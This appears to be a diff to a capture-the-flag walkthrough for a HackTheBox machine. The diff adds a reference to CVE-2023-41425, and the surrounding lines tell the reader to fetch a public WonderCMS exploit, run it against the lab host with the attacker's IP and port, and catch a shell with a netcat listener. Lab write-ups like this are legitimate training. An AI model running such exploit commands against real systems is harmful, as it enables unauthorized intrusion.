@@ -130,6 +130,7 @@
 * now our first step is to always look for ready made exploits on internet
 * go for your browser and write: WonderCMS exploit in github you will find ready made exploit **exploit.py**
 * excute it to know what does it take.
+* you should find **CVE-2023-41425**
 * then you will find that it attacks an endpoint called login/URL so you need to run the following command:
   > python3 exploit.py http://sea.htb/loginURL your_ip your_port
 * then in another terminal open a lister using nc
